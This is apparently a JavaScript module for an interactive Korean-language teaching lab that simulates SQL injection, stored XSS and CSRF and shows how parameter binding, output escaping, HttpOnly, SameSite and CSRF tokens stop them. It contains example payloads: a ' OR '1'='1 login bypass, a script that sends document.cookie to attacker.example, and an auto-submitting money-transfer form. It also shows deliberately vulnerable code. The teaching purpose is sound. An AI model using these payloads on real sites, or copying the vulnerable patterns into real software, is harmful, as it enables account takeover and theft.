Lab.register({
  id: 'webattack', nav: '웹 공격 세 가지', cat: '인증', mode: 'step',
  title: '입력값을 그대로 믿으면 생기는 일',
  intro: 'SQL Injection, XSS, CSRF는 원리가 서로 다릅니다. 하나는 입력이 SQL의 일부가 되고, 하나는 입력이 다른 사용자 브라우저에서 스크립트로 실행되고, 하나는 로그인된 사용자의 브라우저가 대신 요청을 보내게 됩니다. 공격별로 방어를 켜고 끄며 무엇이 달라지는지 보세요.',
  terms: ['SQL Injection', 'XSS(크로스 사이트 스크립팅)', 'CSRF(사이트 간 요청 위조)', 'HttpOnly, Secure, SameSite', '쿠키'], ranks: ['websec', 'auth'],
  controls: [
    { id: 'atk', label: '공격 종류', type: 'select', value: 'sqli', options: [['sqli', 'SQL Injection'], ['xss', 'XSS (저장형)'], ['csrf', 'CSRF']] },
    { id: 'd1', label: '방어', type: 'select', value: 'none', options: [['none', '없음 (문자열을 이어 붙여 SQL 생성)'], ['bind', '파라미터 바인딩 (PreparedStatement)']], show: function (c) { return c.atk === 'sqli'; } },
    { id: 'd2', label: '방어', type: 'select', value: 'none', options: [['none', '없음 (입력을 그대로 화면에 출력)'], ['escape', '출력할 때 이스케이프'], ['httponly', '세션 쿠키에 HttpOnly만 설정']], show: function (c) { return c.atk === 'xss'; } },
    { id: 'd3', label: '방어', type: 'select', value: 'none', options: [['none', '없음 (세션 쿠키가 SameSite=None)'], ['samesite', '세션 쿠키에 SameSite=Lax'], ['token', 'CSRF 토큰 검증']], show: function (c) { return c.atk === 'csrf'; } },
  ],
  presets: [
    { t: '처음 설정으로', d: 'SQL Injection, 방어 없음. 비밀번호 없이 로그인됩니다.', v: { atk: 'sqli', d1: 'none', d2: 'none', d3: 'none' } },
    { t: '파라미터 바인딩', d: '입력이 SQL 문법이 아닌 값으로만 다뤄집니다.', v: { atk: 'sqli', d1: 'bind', d2: 'none', d3: 'none' } },
    { t: 'XSS, 방어 없음', d: '댓글에 넣은 스크립트가 다른 사용자 브라우저에서 실행됩니다.', v: { atk: 'xss', d1: 'none', d2: 'none', d3: 'none' } },
    { t: 'XSS, 출력 이스케이프', d: '스크립트가 글자로만 보입니다.', v: { atk: 'xss', d1: 'none', d2: 'escape', d3: 'none' } },
    { t: 'XSS, HttpOnly만', d: '쿠키는 못 훔치지만 스크립트는 여전히 실행됩니다.', v: { atk: 'xss', d1: 'none', d2: 'httponly', d3: 'none' } },
    { t: 'CSRF, 방어 없음', d: '다른 사이트를 열었을 뿐인데 내 계정으로 요청이 나갑니다.', v: { atk: 'csrf', d1: 'none', d2: 'none', d3: 'none' } },
    { t: 'CSRF, SameSite=Lax', d: '다른 사이트에서 보낸 POST에는 쿠키가 붙지 않습니다.', v: { atk: 'csrf', d1: 'none', d2: 'none', d3: 'samesite' } },
  ],
  code: function (c) {
    if (c.atk === 'sqli') return c.d1 === 'none' ? '// 입력을 문자열로 이어 붙인다\nString sql = "SELECT * FROM member WHERE email = \'" + email\n           + "\' AND password = \'" + password + "\'";\nResultSet rs = statement.executeQuery(sql);' : '// 자리 표시자(?)를 쓰고 값은 따로 넘긴다\nString sql = "SELECT * FROM member WHERE email = ? AND password = ?";\nPreparedStatement ps = connection.prepareStatement(sql);\nps.setString(1, email);\nps.setString(2, password);\nResultSet rs = ps.executeQuery();\n\n// JPA, MyBatis의 #{} 도 내부적으로 이 방식이다';
    if (c.atk === 'xss') return c.d2 === 'escape' ? '<!-- Thymeleaf: th:text 는 자동으로 이스케이프한다 -->\n<p th:text="${comment.content}"></p>\n\n<!-- < 는 &lt; 로, > 는 &gt; 로 바뀌어 출력된다 -->' : '<!-- 입력을 HTML로 그대로 출력한다 -->\n<p th:utext="${comment.content}"></p>' + (c.d2 === 'httponly' ? '\n\n# 세션 쿠키 설정\nserver.servlet.session.cookie.http-only=true' : '');
    return c.d3 === 'token' ? '<!-- 서버가 폼마다 예측할 수 없는 토큰을 심는다 -->\n<form method="post" action="/transfer">\n    <input type="hidden" name="_csrf" value="9f2c...">\n    ...\n</form>\n\n// 스프링 시큐리티는 기본으로 CSRF 토큰을 검증한다\n// 토큰이 없거나 틀리면 403' : '@PostMapping("/transfer")\nvoid transfer(@RequestParam String to, @RequestParam long amount) {\n    // 세션 쿠키로 로그인 사용자를 확인하고 이체한다\n}' + (c.d3 === 'samesite' ? '\n\n# 세션 쿠키 설정\nserver.servlet.session.cookie.same-site=lax' : '\n\n// CSRF 검증 없음: http.csrf(csrf -> csrf.disable())\n\n# 세션 쿠키 설정\nserver.servlet.session.cookie.same-site=none');
  },
  label: function (c) { return { sqli: 'SQL Injection · ' + (c.d1 === 'none' ? '방어 없음' : '바인딩'), xss: 'XSS · ' + { none: '방어 없음', escape: '이스케이프', httponly: 'HttpOnly만' }[c.d2], csrf: 'CSRF · ' + { none: '방어 없음', samesite: 'SameSite=Lax', token: 'CSRF 토큰' }[c.d3] }[c.atk]; },
  columns: ['공격 결과', '피해', '막은 지점'],
  simulate: function (c) {
    var ev = [], sum = [], box = [], res, harm, where = '-';
    function push(s, k) { ev.push({ s: s, k: k, snap: { box: box.slice() } }); }
    if (c.atk === 'sqli') {
      box.push(['공격자가 로그인 폼에 넣은 값', "이메일: admin@shop.com\n비밀번호: ' OR '1'='1"]);
      push("공격자가 비밀번호 칸에 ' OR '1'='1 을 입력합니다. 작은따옴표로 문자열을 일찍 닫고 그 뒤에 SQL 조건을 덧붙이려는 의도입니다.", '');
      if (c.d1 === 'none') {
        box.push(['서버가 만든 SQL', "SELECT * FROM member\n WHERE email = 'admin@shop.com'\n   AND password = '' OR '1'='1'"]);
        push("서버가 입력을 SQL 문자열에 그대로 이어 붙였습니다. 입력의 작은따옴표가 SQL의 문자열을 닫아 버리고, 뒤의 OR '1'='1' 이 SQL 문법의 일부가 됐습니다.", 'bad');
        box.push(['DB의 실행 결과', "조건이 항상 참 → 회원 행이 반환됨\n→ 비밀번호를 몰라도 로그인 성공"]);
        push("'1'='1'은 언제나 참이므로 WHERE 조건 전체가 참이 됩니다. 회원 행이 조회되어 서버는 로그인에 성공했다고 판단합니다.", 'bad');
        res = '성공'; harm = '비밀번호 없이 로그인 (데이터 조회·삭제도 가능)';
        sum.push('입력값이 "값"이 아니라 "SQL 문법"으로 해석된 것이 원인입니다. 같은 방법으로 다른 테이블을 조회하거나 데이터를 지우는 SQL도 끼워 넣을 수 있습니다.');
      } else {
        box.push(['서버가 DB에 보낸 것', "SQL 틀: SELECT * FROM member WHERE email = ? AND password = ?\n값 1: admin@shop.com\n값 2: ' OR '1'='1"]);
        push('서버는 SQL의 틀과 값을 따로 보냅니다. DB는 틀을 먼저 해석해 구조를 확정한 뒤, 값을 자리 표시자에 넣습니다. 값 안에 무엇이 들어 있든 SQL 문법으로 해석되지 않습니다.', 'good');
        box.push(['DB의 실행 결과', "password 컬럼이 문자열 ' OR '1'='1 과 같은 행을 찾음\n→ 0건 → 로그인 실패"]);
        push("DB는 비밀번호가 글자 그대로 ' OR '1'='1 인 회원을 찾습니다. 그런 회원은 없으므로 로그인에 실패합니다.", 'good');
        res = '실패'; harm = '없음'; where = '파라미터 바인딩';
        sum.push('파라미터 바인딩은 SQL의 구조와 값을 분리합니다. 입력을 검사하거나 따옴표를 지우는 식의 대응보다 근본적인 해법입니다. MyBatis에서 ${}는 문자열을 그대로 끼워 넣으므로 같은 문제가 생기고, #{}를 써야 합니다.');
      }
    }
    if (c.atk === 'xss') {
      box.push(['공격자가 남긴 댓글', "<script>\n  fetch('https://attacker.example/c?v=' + document.cookie)\n</script>"]);
      push('공격자가 게시판 댓글에 스크립트 태그를 써넣습니다. 서버는 이것을 댓글 내용으로 DB에 저장합니다.', '');
      if (c.d2 === 'escape') {
        box.push(['피해자 브라우저가 받은 HTML', "<p>&lt;script&gt; fetch(...) &lt;/script&gt;</p>"]);
        push('다른 사용자가 그 게시글을 엽니다. 서버가 댓글을 출력할 때 < 와 > 를 &lt; &gt; 로 바꿨습니다. 브라우저는 이것을 태그가 아니라 글자로 보여 줍니다.', 'good');
        box.push(['피해자 브라우저에서 일어난 일', '스크립트가 실행되지 않음. 화면에 코드가 글자로 보일 뿐']);
        push('스크립트는 실행되지 않습니다.', 'good'); res = '실패'; harm = '없음'; where = '출력 이스케이프';
        sum.push('사용자가 입력한 내용을 화면에 내보낼 때 HTML로 해석되지 않도록 바꾸는 것이 기본 방어입니다. 템플릿 엔진과 프론트 프레임워크는 기본으로 이스케이프하므로, 그 기능을 끄는 출력 방식(th:utext, innerHTML 등)을 쓸 때 주의해야 합니다.');
      } else {
        box.push(['피해자 브라우저가 받은 HTML', "<p><script> fetch('https://attacker.example/c?v=' + document.cookie) </script></p>"]);
        push('다른 사용자가 그 게시글을 엽니다. 서버가 댓글을 HTML에 그대로 넣어 보냈습니다. 브라우저는 이것이 댓글인지 사이트가 넣은 스크립트인지 구별하지 못하고 실행합니다.', 'bad');
        if (c.d2 === 'none') { box.push(['피해자 브라우저에서 일어난 일', '스크립트 실행 → document.cookie의 세션 ID가 공격자 서버로 전송됨']); push('스크립트가 피해자의 세션 쿠키를 읽어 공격자 서버로 보냅니다. 공격자는 그 세션 ID로 피해자인 척 로그인된 상태가 됩니다.', 'bad'); res = '성공'; harm = '세션 탈취 (계정 도용)'; sum.push('XSS는 공격자의 스크립트가 피해자의 브라우저에서, 그 사이트의 권한으로 실행되는 공격입니다.'); }
        else { box.push(['피해자 브라우저에서 일어난 일', '스크립트 실행 → document.cookie에 세션 쿠키가 보이지 않음 (HttpOnly)\n하지만 스크립트는 이 페이지에서 무엇이든 할 수 있음']); push('HttpOnly 쿠키는 스크립트에서 읽을 수 없어서 세션 ID는 빠져나가지 않습니다. 그러나 스크립트 자체는 실행됐으므로, 피해자의 이름으로 글을 쓰거나 화면을 바꾸는 요청을 그 자리에서 보낼 수 있습니다.', 'bad'); res = '일부 성공'; harm = '쿠키는 지켰지만 피해자 권한으로 요청 가능'; where = 'HttpOnly (쿠키 읽기만 막음)'; sum.push('HttpOnly는 피해를 줄이는 보조 수단일 뿐 XSS 자체를 막지 못합니다. 출력 이스케이프와 함께 써야 합니다.'); }
      }
    }
    if (c.atk === 'csrf') {
      box.push(['피해자의 상태', 'bank.com에 로그인돼 있음 (브라우저에 세션 쿠키 보관' + (c.d3 === 'none' ? ', 쿠키 속성 SameSite=None' : c.d3 === 'samesite' ? ', 쿠키 속성 SameSite=Lax' : '') + ')']);
      push('피해자는 은행 사이트에 로그인한 채로 다른 탭에서 공격자가 만든 사이트를 엽니다.', '');
      box.push(['공격자 사이트에 숨겨진 폼', '<form action="https://bank.com/transfer" method="post">\n  <input name="to" value="공격자 계좌">\n  <input name="amount" value="1000000">\n</form>\n<script>document.forms[0].submit()</script>']);
      push('그 페이지에는 은행의 이체 주소로 보내는 폼이 숨어 있고, 열자마자 자동으로 제출됩니다. 요청을 보내는 것은 공격자가 아니라 피해자의 브라우저입니다.', '');
      if (c.d3 === 'samesite') { box.push(['bank.com이 받은 요청', 'POST /transfer\n(세션 쿠키 없음)\n→ 로그인되지 않은 요청으로 처리 → 거절']); push('세션 쿠키에 SameSite=Lax가 설정돼 있습니다. 브라우저는 다른 사이트에서 시작된 POST 요청에는 이 쿠키를 붙이지 않습니다. 은행 서버는 로그인하지 않은 요청으로 보고 거절합니다.', 'good'); res = '실패'; harm = '없음'; where = 'SameSite 쿠키'; sum.push('SameSite=Lax는 다른 사이트에서 보낸 POST에 쿠키가 붙지 않게 합니다. 요즘 브라우저는 SameSite를 지정하지 않은 쿠키도 Lax처럼 다루지만(발급 직후 2분가량은 예외로 붙습니다), 명시해 두는 것이 안전합니다. 다른 도메인의 화면에 끼워 넣는 서비스처럼 SameSite=None이 꼭 필요한 경우에는 CSRF 토큰이 필수입니다.'); }
      else if (c.d3 === 'token') { box.push(['bank.com이 받은 요청', 'POST /transfer\nCookie: 세션 ID (자동으로 붙음)\n_csrf 토큰: 없음\n→ 403 거절']); push('브라우저가 세션 쿠키를 붙여 보냈지만, 은행 서버는 폼에 심어 둔 CSRF 토큰도 함께 요구합니다. 공격자는 그 토큰 값을 알 수 없으므로 요청에 넣지 못했습니다. 서버가 403으로 거절합니다.', 'good'); res = '실패'; harm = '없음'; where = 'CSRF 토큰 검증'; sum.push('CSRF 토큰은 "이 요청이 우리 사이트의 화면에서 시작됐는가"를 확인합니다. 쿠키는 브라우저가 자동으로 붙이지만 토큰은 그렇지 않다는 점을 이용합니다.'); }
      else { box.push(['bank.com이 받은 요청', 'POST /transfer\nCookie: 세션 ID (브라우저가 자동으로 붙임)\nto=공격자 계좌, amount=1000000\n→ 정상 요청으로 판단 → 이체 실행']); push('이 세션 쿠키는 다른 사이트에서 보낸 요청에도 붙도록(SameSite=None) 설정돼 있습니다. 브라우저는 bank.com으로 가는 요청에 세션 쿠키를 자동으로 붙입니다. 은행 서버 입장에서는 로그인한 사용자가 보낸 정상적인 이체 요청과 구별할 수 없습니다. 이체가 실행됩니다.', 'bad'); res = '성공'; harm = '피해자 계좌에서 이체 실행'; sum.push('CSRF는 쿠키가 요청에 자동으로 붙는다는 점을 악용합니다. 공격자는 쿠키 값을 훔치지 않고도, 피해자의 브라우저가 대신 요청을 보내게 만듭니다.'); }
      if (c.d3 !== 'none') sum.push('인증 정보를 쿠키가 아니라 Authorization 헤더로 보내는 API(JWT 등)는 브라우저가 자동으로 붙여 주지 않으므로 CSRF의 대상이 되기 어렵습니다. 그래서 그런 API 서버에서는 CSRF 보호를 끄기도 합니다.');
    }
    sum.unshift('공격 결과: ' + res + '. 피해: ' + harm + '.');
    return { events: ev, summary: sum, row: [res, harm, where] };
  },
  render: function (v, sim, t, H, shown) {
    var last = shown[shown.length - 1], box = last ? last.snap.box : [];
    if (!box.length) { H.text(v, '실행을 누르면 공격 과정을 단계별로 보여 줍니다.'); return; }
    box.forEach(function (b, i) { H.title(v, b[0]); var p = H.el('pre', 'code', b[1]); if (i === box.length - 1) p.style.borderColor = 'var(--busy-edge)'; v.appendChild(p); });
  },
  // 그림: 공격자의 입력이 서버를 거쳐 어떤 결과가 되는지 세 칸을 위에서 아래로 잇는다.
  draw: function (P, sim, shown) {
    var last = shown[shown.length - 1], box = last ? last.snap.box : [], n = box.length, k = last ? last.k : '';
    P.size(680, 404);
    for (var i = 0; i < 3; i++) {
      var b = box[i], lines = b ? b[1].split('\n').slice(0, 4) : [' '];
      P.box('bx' + i, 16, 16 + i * 112, 648, 98, { cls: !b ? 'ghost' : i === n - 1 ? (k === 'bad' ? 'bad' : k === 'good' ? 'good' : 'hot') : 'plain', title: b ? b[0] : ['공격자가 넣는 값', '서버가 그것으로 만든 것', '결과'][i], sub: lines, mono: !!b });
      if (i && b) P.arrow('ar' + i, 'bx' + (i - 1) + ':b:0.08', 'bx' + i + ':t:0.08');
    }
    P.box('res', 16, 352, 648, 36, { cls: n < 3 ? 'ghost' : k === 'bad' ? 'bad' : 'good', title: '공격 결과', right: n < 3 ? '진행 중' : k === 'bad' ? '공격 성공' : '막음' });
    P.note('위에서 아래로 진행합니다. 공격자가 넣은 값이 가운데에서 어떻게 다뤄지느냐에 따라 맨 아래 결과가 갈립니다. 줄이 길면 잘려 보이므로 전체 내용은 오른쪽 화면에서 확인하세요.');
  },
  assume: '세 공격 모두 원리를 보이기 위한 교과서적인 예이며, OWASP의 설명과 스프링 시큐리티 문서의 방어 방식을 따랐습니다. 비밀번호를 SQL에서 직접 비교하는 로그인 코드는 SQL Injection을 설명하기 위한 것으로, 실제로는 비밀번호를 해시로 저장하고 애플리케이션에서 검증합니다. 방어는 한 가지만 켠 상태를 비교했지만 실무에서는 여러 방어를 겹쳐 씁니다. 세 공격 모두 일부를 실제로 실행해 확인했습니다. SQL Injection은 실제 SQL 엔진(SQLite)에서 문자열 연결은 1행이 조회되고 바인딩은 0행이었습니다. XSS는 실제 브라우저(크로미움 기반)에서 그대로 출력한 댓글의 스크립트가 실행되어 쿠키를 읽었고, 이스케이프하면 실행되지 않았으며, HttpOnly 쿠키는 스크립트가 실행돼도 보이지 않았습니다. CSRF는 다른 사이트에서 자동 제출한 POST에 SameSite=None 쿠키는 붙었고 SameSite=Lax 쿠키는 붙지 않았습니다. SameSite를 지정하지 않은 쿠키는 발급 직후에는 붙었지만 2분쯤 지난 뒤에는 붙지 않았습니다. CSRF 토큰 검증은 서버 쪽 로직이라 따로 실행하지 않았습니다.',
});
